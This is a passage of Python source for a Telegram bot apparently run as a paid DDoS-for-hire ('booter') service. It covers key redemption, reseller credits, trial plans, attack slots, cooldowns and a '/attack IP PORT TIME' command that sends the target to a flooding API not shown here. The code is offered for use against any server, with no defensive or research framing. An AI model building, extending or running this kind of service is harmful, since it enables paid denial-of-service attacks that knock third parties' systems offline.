                f"║  {E['noentry']} ALL SLOTS BUSY                ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['chart2']} Use /status to monitor"
            )
        if uid in active_attacks:
            return False, f"{E['noentry']} You already have an active attack running"
        return True, None

    allowed, _ = is_user_allowed(uid)
    if not allowed:
        return False, no_plan_msg()
    if duration > MAX_ATTACK_DURATION:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} DURATION LIMIT               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['clock']} Max allowed: {C(fmt_time(MAX_ATTACK_DURATION))}"
        )
    if uid in user_cooldowns and user_cooldowns[uid] > time.time():
        rem = user_cooldowns[uid] - time.time()
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['hourglass']} COOLDOWN ACTIVE               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['stopwatch']} Wait : {C(fmt_time(rem))}\n"
            f"{E['chart2']} Use /status to monitor"
        )
    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} ALL SLOTS BUSY                ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['chart2']} Use /status to monitor"
        )
    if uid in active_attacks:
        return False, f"{E['noentry']} You already have an active attack running"
    if feedback_required and uid in pending_feedback:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['camera']} SCREENSHOT REQUIRED           ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['warning']} Send your last attack screenshot first"
        )
    return True, None

def start_attack_dm(chat_id, uid, target, port, duration, username=None):
    can, err = can_attack_dm(uid, duration)
    if not can:
        bot.send_message(chat_id, err, parse_mode='HTML'); return

    active_attacks[uid] = {"target":target,"port":port,"duration":duration,
                           "start_time":time.time(),"chat_id":chat_id}
    THREAD_POOL.submit(fire_api, target, port, duration, uid, username)

    txt = build_progress_msg(target, port, duration, 0, uid, username, False, None, 0)
    msg = bot.send_message(chat_id, txt, parse_mode='HTML')
    start = time.time()

    threading.Thread(
        target=run_attack_progress,
        args=(chat_id, msg.message_id, target, port, duration, uid, start, username, False, None, None),
        daemon=True
    ).start()

# ══════════════════════════════════════════════
# ⚡ ATTACK FLOW — GROUP
# ══════════════════════════════════════════════
def can_attack_group(uid, duration, chat_id):
    cfg = get_group_cfg(chat_id)
    if not cfg:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} GROUP NOT REGISTERED          ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['key']} Ask admin to register this group"
        )
    if is_admin(uid): return True, None
    if is_reseller(uid): return True, None

    # Group approved = FREE attack (no plan needed)
    # Plan check removed from group

    if duration > cfg["max_time"]:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} DURATION LIMIT               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['clock']} Max in this group: {C(fmt_time(cfg['max_time']))}"
        )

    rem = group_cooldown_remaining(chat_id, uid)
    if rem > 0:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['hourglass']} COOLDOWN ACTIVE               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['stopwatch']} Wait : {C(fmt_time(rem))}\n"
            f"{E['chart2']} Use /status to monitor"
        )

    if group_active_count(chat_id) >= cfg["max_slots"]:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} ALL SLOTS BUSY                ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['chart2']} Use /status to monitor"
        )

    if str(uid) in group_active_attacks.get(str(chat_id), {}):
        return False, f"{E['noentry']} You already have an active attack in this group"

    if feedback_required and uid in pending_feedback:
        return False, (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['camera']} SCREENSHOT REQUIRED           ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['warning']} Send your last attack screenshot first"
        )
    return True, None

def start_attack_group(chat_id, uid, target, port, duration, username=None, group_name=None):
    can, err = can_attack_group(uid, duration, chat_id)
    if not can:
        bot.send_message(chat_id, err, parse_mode='HTML'); return

    group_active_attacks.setdefault(str(chat_id), {})[str(uid)] = {
        "target":target,"port":port,"duration":duration,"start_time":time.time()
    }
    THREAD_POOL.submit(fire_api, target, port, duration, uid, username)

    txt = build_progress_msg(target, port, duration, 0, uid, username, True, group_name, 0)
    msg = bot.send_message(chat_id, txt, parse_mode='HTML')
    start = time.time()

    threading.Thread(
        target=run_attack_progress,
        args=(chat_id, msg.message_id, target, port, duration, uid, start, username, True, chat_id, group_name),
        daemon=True
    ).start()

# ══════════════════════════════════════════════
# 🛡️ PRE-CHECK
# ══════════════════════════════════════════════
def pre_check(message):
    uid = message.from_user.id
    if is_admin(uid): return True
    if maintenance_mode:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['gear']} MAINTENANCE MODE              ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['hourglass']} Bot is under maintenance — back soon",
            parse_mode='HTML')
        return False
    banned = load(BANNED_FILE, {})
    if str(uid) in banned:
        reason = banned[str(uid)].get("reason","")
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['lock']} ACCESS DENIED                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['noentry']} You are banned from this bot"
            + (f"\n{E['clipboard']} Reason: {reason}" if reason else "")
            + f"\n{E['bell']} Contact admin for unban",
            parse_mode='HTML')
        return False
    if force_join:
        try:
            member = bot.get_chat_member(CHANNEL_ID, uid)
            if member.status not in ['member','administrator','creator']:
                markup = types.InlineKeyboardMarkup()
                markup.add(
                    types.InlineKeyboardButton("Join Channel", url=CHANNEL_URL),
                    types.InlineKeyboardButton("✅ Verify", callback_data="verify")
                )
                bot.send_message(message.chat.id,
                    f"╔══════════════════════════════════╗\n"
                    f"║  {E['bell']} JOIN REQUIRED                 ║\n"
                    f"╚══════════════════════════════════╝\n"
                    f"\n{E['globe']} Join our channel to use this bot!",
                    parse_mode='HTML', reply_markup=markup)
                return False
        except: pass
    return True

def require_plan_or_admin(message):
    """Returns True if user has plan / is admin, else sends no_plan_msg and returns False."""
    uid = message.from_user.id
    if is_admin(uid) or is_reseller(uid): return True
    allowed, _ = is_user_allowed(uid)
    if not allowed:
        bot.send_message(message.chat.id, no_plan_msg(), parse_mode='HTML')
        return False
    return True

# ══════════════════════════════════════════════
# 🤖 BOT
# ══════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ── Verify callback ──────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "verify")
def verify_callback(call):
    uid = call.from_user.id
    try:
        member = bot.get_chat_member(CHANNEL_ID, uid)
        if member.status in ['member','administrator','creator']:
            bot.answer_callback_query(call.id, "✅ Verified!")
            send_welcome(call.message.chat.id, call.from_user)
        else:
            bot.answer_callback_query(call.id, "Not joined yet!", show_alert=True)
    except:
        bot.answer_callback_query(call.id, "Error — try again", show_alert=True)

# ══════════════════════════════════════════════
# 🎨 WELCOME + PLAN CARD
# ══════════════════════════════════════════════
def send_welcome(chat_id, user):
    uid   = user.id
    uname = user.username or user.first_name
    role  = get_role(uid)
    allowed, expiry = is_user_allowed(uid)

    if expiry:
        rem = expiry - datetime.datetime.now()
        d = rem.days; h = rem.seconds // 3600; m = (rem.seconds % 3600) // 60
        status_line = f"{E['green']} Active — {d}d {h}h {m}m left"
    elif is_admin(uid) or is_reseller(uid):
        status_line = f"{E['crown']} Unlimited Access"
    else:
        status_line = f"{E['red']} No Active Plan"

    role_emoji = {
        "Owner":    E["crown"],
        "Co-Owner": E["crown2"],
        "Reseller": E["gem"],
        "User":     E["user"],
    }.get(role, E["user"])

    bot.send_message(chat_id,
        f"╔══════════════════════════════════╗\n"
        f"║  {E['bolt']} {E['crown']} ATTACK BOT              ║\n"
        f"║      Welcome to Attack Bot       ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"╭─ {E['user']} {B('YOUR PROFILE')}\n"
        f"│\n"
        f"├─ {E['id']} ID      ›  {C(str(uid))}\n"
        f"├─ {E['clipboard']} Name    ›  {uname}\n"
        f"├─ {role_emoji} Role    ›  {B(role)}\n"
        f"╰─ {status_line}\n"
        f"\n"
        f"╭─ {E['rocket']} {B('QUICK ACTIONS')}\n"
        f"│\n"
        f"├─ {E['key']}  /redeem  ›  Activate a key\n"
        f"╰─ {E['clipboard']} /help    ›  All commands\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['star2']} Powered by Sharp\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML')

def _plan_card(uid, info=None):
    if info is None:
        info = load(USER_FILE, {}).get(str(uid), {})
    if not info:
        return no_plan_msg()
    try:
        expiry = datetime.datetime.fromisoformat(info["expiry"])
        rem    = expiry - datetime.datetime.now()
        if rem.total_seconds() <= 0:
            return (
                f"╔══════════════════════════════════╗\n"
                f"║  {E['red']} PLAN EXPIRED                  ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n{E['key']} Use /redeem KEY to renew"
            )
        d = rem.days; h = rem.seconds//3600; m = (rem.seconds%3600)//60
        ptype = "Trial" if info.get("trial") else "Paid"
        return (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['clipboard']} MY PLAN                       ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['green']} Status   : {B('Active')}\n"
            f"   {E['key']}  Key      : {C(info.get('key','N/A'))}\n"
            f"   {E['stopwatch']} Redeemed : {C(info.get('redeemed_on','N/A'))}\n"
            f"   {E['calendar']} Expires  : {C(expiry.strftime('%Y-%m-%d %H:%M:%S'))}\n"
            f"   {E['hourglass']} Left     : {C(f'{d}d {h}h {m}m')}\n"
            f"   {E['chart2']} Type     : {B(ptype)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    except:
        return (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['warning']} PLAN DATA ERROR               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['bell']} Contact admin"
        )

# ══════════════════════════════════════════════
# 📋 COMMANDS
# ══════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def start_cmd(message):
    if not pre_check(message): return
    uid = message.from_user.id
    su  = load(STARTED_USERS_FILE, [])
    if str(uid) not in su:
        su.append(str(uid)); save(STARTED_USERS_FILE, su)
    send_welcome(message.chat.id, message.from_user)

@bot.message_handler(commands=['help'])
def help_cmd(message):
    if not pre_check(message): return
    uid    = message.from_user.id
    is_adm = is_admin(uid)
    is_res = is_reseller(uid)
    allowed, _ = is_user_allowed(uid)

    # Non-plan users see all commands but get NO PLAN error on use
    if not is_adm and not is_res and not allowed:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['bolt']} {E['star2']} COMMAND CENTER             ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['arrow']} {B('ALL USERS')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"\n"
            f"   {E['bolt2']}   /start        ›  Welcome & your status\n"
            f"   {E['clipboard']}  /help         ›  This command list\n"
            f"   {E['id']}    /id           ›  Your Telegram user ID\n"
            f"   {E['key']}   /redeem KEY   ›  Activate a key\n"
            f"   {E['chart2']}  /myplan       ›  Your plan details & expiry\n"
            f"   {E['rocket']}  /attack IP PORT TIME  ›  Launch attack\n"
            f"   {E['chart']}   /status       ›  Live attack monitor\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{E['key']} Get a key from admin to unlock all features\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode='HTML')
        return

    lines = [
        f"╔══════════════════════════════════╗",
        f"║  {E['bolt']} {E['star2']} COMMAND CENTER             ║",
        f"╚══════════════════════════════════╝",
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"   {E['arrow']} {B('ALL USERS')}",
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"",
        f"   {E['bolt2']}  /start        ›  Welcome & your status",
        f"   {E['clipboard']} /help         ›  This command list",
        f"   {E['id']}   /id           ›  Your Telegram user ID",
        f"   {E['key']}  /redeem KEY   ›  Activate a key",
        f"   {E['chart2']} /myplan       ›  Your plan details & expiry",
        f"   {E['rocket']} /attack IP PORT TIME  ›  Launch attack",
        f"   {E['chart']}  /status       ›  Live attack monitor",
    ]

    if is_res or is_adm:
        lines += [
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('RESELLER')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['moneybag']}  /balance            ›  Your credit balance",
            f"   {E['gem']}   /genkey TYPE COUNT  ›  Generate keys (12h…30d)",
            f"   {E['clipboard']}  /mykeys             ›  Your generated key list",
            f"   {E['chart2']}  /reseller_panel     ›  Dashboard + pricing",
        ]

    if is_adm:
        lines += [
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('KEY MANAGEMENT')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['key']}   /genadmin PREFIX DUR UNIT COUNT",
            f"   {E['gift']}  /gentrial PREFIX DUR UNIT COUNT [MAX]",
            f"   {E['cross']} /deletetrialkeys",
            f"   {E['clipboard']} /allkeys",
            f"   {E['skull']} /removekey KEY",
            f"   {E['eye']}  /keyinfo KEY",
            f"   {E['bolt']} /inkey KEY AMT      ›  +hours to key",
            f"   {E['warning']} /removeinkey KEY AMT  ›  -hours from key",
            f"   {E['bolt2']} /inallkey AMT       ›  +hours all keys",
            f"   {E['warning']} /allremoveinkey AMT   ›  -hours all keys",
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('USER MANAGEMENT')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['people']}  /users",
            f"   {E['cross']}  /removeuser USER_ID",
            f"   {E['noentry']} /revoke USER_ID [S|L]",
            f"   {E['calendar']} /extenduser USER_ID DAYS",
            f"   {E['refresh']} /extendusers DUR UNIT",
            f"   {E['lock']}   /ban USER_ID REASON",
            f"   {E['unlock']} /unban USER_ID",
            f"   {E['clipboard']} /bannedlist",
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('RESELLER MANAGEMENT')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['handshake']} /addreseller USER_ID",
            f"   {E['cross']}    /removereseller USER_ID",
            f"   {E['people']}   /resellers",
            f"   {E['money']}    /addbalance USER_ID AMT",
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('CO-OWNER')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['crown']}  /addcoowner USER_ID",
            f"   {E['cross']}  /removecoowner USER_ID",
            f"   {E['people']} /coowners",
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('GROUP SYSTEM')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['globe']}  /addgroup CHAT_ID SLOTS TIME COOLDOWN",
            f"   {E['cross']}  /removegroup CHAT_ID",
            f"   {E['clipboard']} /grouplist",
            f"",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"   {E['arrow']} {B('SYSTEM')}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"",
            f"   {E['gear']}   /setlimit SLOTS DUR COOLDOWN",
            f"   {E['bell']}   /broadcast MSG",
            f"   {E['chart']}  /stats",
            f"   {E['gear']}   /systeminfo",
            f"   {E['clipboard']} /logs",
            f"   {E['warning']} /faillogs",
            f"   {E['cross']}  /clearlogs",
            f"   {E['refresh']} /maintanence on|off",
            f"   {E['camera']} /feedback on|off",
            f"   {E['globe']}  /forcejoin on|off",
            f"   {E['unlock']} /clearpending USER_ID",
            f"   {E['check']}  /approvefb USER_ID",
            f"   {E['cross']}  /rejectfb USER_ID",
        ]

    lines.append(f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode='HTML')

@bot.message_handler(commands=['id'])
def id_cmd(message):
    if not pre_check(message): return
    uid = message.from_user.id
    txt = (
        f"╔══════════════════════════════════╗\n"
        f"║  {E['id']} YOUR ID                       ║\n"
        f"╚══════════════════════════════════╝\n"
        f"\n"
        f"   {E['user']}  User ID : {C(str(uid))}"
    )
    if message.chat.type in ["group","supergroup"]:
        txt += f"\n   {E['globe']} Group ID : {C(str(message.chat.id))}"
    bot.send_message(message.chat.id, txt, parse_mode='HTML')

@bot.message_handler(commands=['myplan'])
def myplan_cmd(message):
    if not pre_check(message): return
    uid = message.from_user.id
    if is_admin(uid):
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['crown']} ADMIN ACCESS                  ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['gem']} Unlimited access — no expiry",
            parse_mode='HTML'); return
    info = load(USER_FILE, {}).get(str(uid))
    bot.send_message(message.chat.id, _plan_card(uid, info), parse_mode='HTML')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    if not pre_check(message): return
    uid      = message.from_user.id
    uname    = message.from_user.username or message.from_user.first_name
    is_group = message.chat.type in ["group","supergroup"]
    args     = message.text.split()

    # ═══════════════════════════════════════════════
    # PLAN CHECK & GROUP LOGIC
    # ═══════════════════════════════════════════════
    if is_group:
        # GROUP MODE
        cfg = get_group_cfg(message.chat.id)
        if not cfg:
            # Group not registered — show error
            bot.send_message(message.chat.id,
                f"╔══════════════════════════════════╗\n"
                f"║  {E['noentry']} GROUP NOT REGISTERED          ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n"
                f"{E['key']} Ask admin to register this group",
                parse_mode='HTML')
            return

        # Group registered — check if user has plan OR allow free access
        user_has_plan = False
        if is_admin(uid) or is_reseller(uid):
            user_has_plan = True
        else:
            allowed, _ = is_user_allowed(uid)
            if allowed:
                user_has_plan = True

        # If no plan and not reseller/admin, check if group is approved
        # Group approved = FREE attack allowed
        # So no plan check needed for approved groups

        if len(args) != 4:
            # Compact group usage guide
            slots_used  = group_active_count(message.chat.id)
            slots_total = cfg["max_slots"]
            slots_free  = max(0, slots_total - slots_used)
            busy        = slots_used >= slots_total

            status_line = f"{E['red']} BUSY" if busy else f"{E['green']} FREE ({slots_free}/{slots_total})"

            bot.send_message(message.chat.id,
                f"{E['rocket']} {B('ATTACK USAGE')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   {E['lightbulb']} /attack IP PORT TIME\n"
                f"   {E['clock']} Max Time : {B(str(cfg['max_time']) + ' sec')}\n"
                f"   {E['fire']}  Slots    : {status_line}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   {E['chart']} Ex: {C('/attack 1.2.3.4 8080 60')}",
                parse_mode='HTML')
            return

    else:
        # DM MODE — strict plan check
        if not is_admin(uid) and not is_reseller(uid):
            allowed, _ = is_user_allowed(uid)
            if not allowed:
                bot.send_message(message.chat.id, no_plan_msg(), parse_mode='HTML')
                return

        if len(args) != 4:
            bot.send_message(message.chat.id,
                f"╔══════════════════════════════════╗\n"
                f"║  {E['rocket']} ATTACK                        ║\n"
                f"╚══════════════════════════════════╝\n"
                f"\n"
                f"   {E['arrow']} Usage   : /attack IP PORT TIME\n"
                f"   {E['lightbulb']} Example : {C('/attack 1.2.3.4 8080 60')}",
                parse_mode='HTML'); return

    target = args[1]
    try:   port = int(args[2])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Port must be a number (1-65535)", parse_mode='HTML'); return
    try:   duration = int(args[3])
    except:
        bot.send_message(message.chat.id, f"{E['noentry']} Duration must be a number in seconds", parse_mode='HTML'); return

    if port < 1 or port > 65535:
        bot.send_message(message.chat.id, f"{E['noentry']} Port must be 1–65535", parse_mode='HTML'); return
    if duration < 10:
        bot.send_message(message.chat.id, f"{E['noentry']} Minimum duration: 10 seconds", parse_mode='HTML'); return

    if is_group:
        try: gname = message.chat.title or "Group Chat"
        except: gname = "Group Chat"
        start_attack_group(message.chat.id, uid, target, port, duration, uname, gname)
    else:
        start_attack_dm(message.chat.id, uid, target, port, duration, uname)

@bot.message_handler(commands=['status'])
def status_cmd(message):
    if not pre_check(message): return
    uid      = message.from_user.id
    is_group = message.chat.type in ["group","supergroup"]

    # Plan check for DM (non-group) users
    if not is_group:
        if not is_admin(uid) and not is_reseller(uid):
            allowed, _ = is_user_allowed(uid)
            if not allowed:
                bot.send_message(message.chat.id, no_plan_msg(), parse_mode='HTML')
                return

    def build_status():
        sp = spinner(int(time.time()))
        lines = [
            f"╔══════════════════════════════════╗",
            f"║  {E['bolt']} {E['chart2']} LIVE STATUS {sp}          ║",
            f"╚══════════════════════════════════╝",
            f"",
        ]
        if is_group:
            cfg = get_group_cfg(message.chat.id)
            if cfg:
                active_cnt  = group_active_count(message.chat.id)
                free_cnt    = max(0, cfg["max_slots"] - active_cnt)
                slot_pct    = int((active_cnt / max(cfg["max_slots"],1)) * 100)
                slot_bar    = progress_bar(slot_pct, uid)
                lines += [
                    f"{E['fire']} {B('GROUP SLOTS MONITOR')}",
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                    f"   ├─ {E['green']} Active : {active_cnt}",
                    f"   ├─ {E['blue']}  Free   : {free_cnt}",
                    f"   └─ {E['gem']}   Total  : {cfg['max_slots']}",
                    f"   {E['chart2']} Usage  : {C(slot_bar + ' ' + str(slot_pct) + '%')}",
                ]
                ga = group_active_attacks.get(str(message.chat.id), {})
                if ga:
                    lines.append(f"\n───────────────────────────────")
                    lines.append(f"{E['target']} {B('Active Attacks')} ({len(ga)})")
                    for a_uid, a in list(ga.items())[:5]:
                        el  = int(time.time() - a["start_time"])
                        rem = max(0, a["duration"] - el)
                        pct = int((el / max(a["duration"],1)) * 100)
                        bar = progress_bar(pct, int(a_uid))
                        lines.append(f"\n   {E['user']}  User ID  : {C(a_uid)}")
                        lines.append(f"   {E['target']} Target   : {C(a['target'] + ':' + str(a['port']))}")
                        lines.append(f"   {E['stopwatch']} Time     : {C(fmt_time(rem))} remaining")
                        lines.append(f"   {E['chart2']} Progress : {C(bar + ' ' + str(pct) + '%')}")
                else:
                    lines.append(f"\n   {E['cross']} No active attacks in this group")
                lines.append(f"\n───────────────────────────────")
                rem = group_cooldown_remaining(message.chat.id, uid)
                if rem > 0:
                    lines.append(f"{E['hourglass']} {B('Your cooldown')} : {C(fmt_time(rem))}")
                else:
                    lines.append(f"{E['check']} {B('You are ready to attack')}")
                    lines.append(f"   {E['stopwatch']} Cooldown : 0s")
            else:
                lines.append(f"{E['noentry']} This group is not registered")
        else:
            total     = MAX_CONCURRENT_ATTACKS
            active_c  = len(active_attacks)
            free_c    = max(0, total - active_c)
            slot_pct  = int((active_c / max(total,1)) * 100)
            slot_bar  = progress_bar(slot_pct, uid)
            lines += [
                f"{E['fire']} {B('DM SLOTS MONITOR')}",
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                f"   ├─ {E['green']} Active : {active_c}",
                f"   ├─ {E['blue']}  Free   : {free_c}",
                f"   └─ {E['gem']}   Total  : {total}",
                f"   {E['chart2']} Usage  : {C(slot_bar + ' ' + str(slot_pct) + '%')}",
            ]
            if active_attacks:
                lines.append(f"\n───────────────────────────────")
                lines.append(f"{E['target']} {B('Active Attacks')} ({active_c})")
                for a_uid, a in list(active_attacks.items())[:5]:
                    el  = int(time.time() - a["start_time"])
                    rem = max(0, a["duration"] - el)
                    pct = int((el / max(a["duration"],1)) * 100)
                    bar = progress_bar(pct, a_uid)
                    users_data = load(USER_FILE, {})
                    u_info     = users_data.get(str(a_uid), {})
                    ptype      = "Trial" if u_info.get("trial") else "Paid"
                    lines.append(f"\n   {E['user']}  User ID  : {C(str(a_uid))}")
                    lines.append(f"   {E['check']} {ptype}")
                    lines.append(f"   {E['bolt']}   Target   : {C(a['target'] + ':' + str(a['port']))}")
                    lines.append(f"   {E['stopwatch']} Time     : {C(fmt_time(rem))} remaining")
                    lines.append(f"   {E['chart2']} Progress : {C(bar + ' ' + str(pct) + '%')}")
            else:
                lines.append(f"\n   {E['cross']} No active attacks")
            lines.append(f"\n───────────────────────────────")
            if uid in user_cooldowns and user_cooldowns[uid] > time.time():
                lines.append(f"{E['hourglass']} {B('Your cooldown')} : {C(fmt_time(user_cooldowns[uid] - time.time()))}")
            else:
                lines.append(f"{E['check']} {B('You are ready to attack')}")
                lines.append(f"   {E['stopwatch']} Cooldown : 0s")
            if feedback_required and uid in pending_feedback:
                lines.append(f"\n{E['camera']} {B('Screenshot required')} — send to unlock")

        lines.append(f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        return "\n".join(lines)

    msg = bot.send_message(message.chat.id, build_status(), parse_mode='HTML')

    def live_update(cid, mid):
        for _ in range(60):
            time.sleep(5)
            try: bot.edit_message_text(build_status(), cid, mid, parse_mode='HTML')
            except: pass
            if is_group:
                if not group_active_attacks.get(str(message.chat.id), {}): break
            else:
                if not active_attacks: break

    threading.Thread(target=live_update, args=(message.chat.id, msg.message_id), daemon=True).start()

# ── /redeem ───────────────────────────────────
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    if not pre_check(message): return
    if message.chat.type != 'private':
        bot.send_message(message.chat.id, f"{E['noentry']} Use /redeem in private chat with the bot", parse_mode='HTML'); return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['key']} REDEEM KEY                    ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['arrow']} Usage   : /redeem YOUR-KEY\n"
            f"   {E['lightbulb']} Or send the key directly (no command)\n"
            f"   {E['arrow']} Example : {C('/redeem VIP-AbCdEfGh12345678')}",
            parse_mode='HTML'); return
    _do_redeem(message, args[1])

def _do_redeem(message, key):
    uid      = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    result, expiry = redeem_key(uid, key, username)

    if result == "invalid":
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['cross']} INVALID KEY                   ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['lightbulb']} Double-check the key or contact admin",
            parse_mode='HTML')
    elif result == "used":
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} KEY ALREADY USED              ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['lightbulb']} Each key can only be redeemed once",
            parse_mode='HTML')
    elif result == "trial_already_used":
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['noentry']} TRIAL ALREADY CLAIMED         ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n{E['lightbulb']} Each account can only claim one trial key",
            parse_mode='HTML')
    elif result == "already_active":
        info = load(USER_FILE, {}).get(str(uid), {})
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['warning']} PLAN ALREADY ACTIVE           ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            + _plan_card(uid, info) +
            f"\n\n{E['lightbulb']} Your plan must expire before redeeming a new key",
            parse_mode='HTML')
    elif result == "success":
        rem = expiry - datetime.datetime.now()
        d = rem.days; h = rem.seconds//3600; m = (rem.seconds%3600)//60
        bot.send_message(message.chat.id,
            f"╔══════════════════════════════════╗\n"
            f"║  {E['check']} {E['party']} KEY REDEEMED               ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"   {E['gift']}    Duration : {B(f'{d}d {h}h {m}m')}\n"
            f"   {E['calendar']} Expires  : {C(expiry.strftime('%Y-%m-%d %H:%M:%S'))}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"\n"
            f"   {E['rocket']} /attack IP PORT TIME  ›  Launch\n"
            f"   {E['chart2']} /myplan               ›  Check time",
            parse_mode='HTML')

KEY_PATTERN = re.compile(r'^[A-Za-z0-9]+-[A-Za-z0-9]{8,}$')

@bot.message_handler(content_types=['text'], func=lambda m: (
    m.chat.type == 'private' and
    not m.text.startswith('/') and
    KEY_PATTERN.match(m.text.strip())
))
def auto_redeem(message):
    if not pre_check(message): return
    _do_redeem(message, message.text.strip())

# ── Photo feedback ────────────────────────────
@bot.message_handler(content_types=['photo'])
def photo_handler(message):
    if not pre_check(message): return
    uid = message.from_user.id
    if not (feedback_required and uid in pending_feedback): return
    file_id = message.photo[-1].file_id
    last    = last_attack.get(uid, {})
    now     = time.time()
    end_ts  = last.get("end_timestamp", 0)
    if now - end_ts <= 300:
        cap = (
            f"╔══════════════════════════════════╗\n"
            f"║  {E['camera']} USER FEEDBACK                 ║\n"
            f"╚══════════════════════════════════╝\n"
            f"\n"
            f"   {E['target']} IP    : {C(last.get('target','N/A'))}\n"
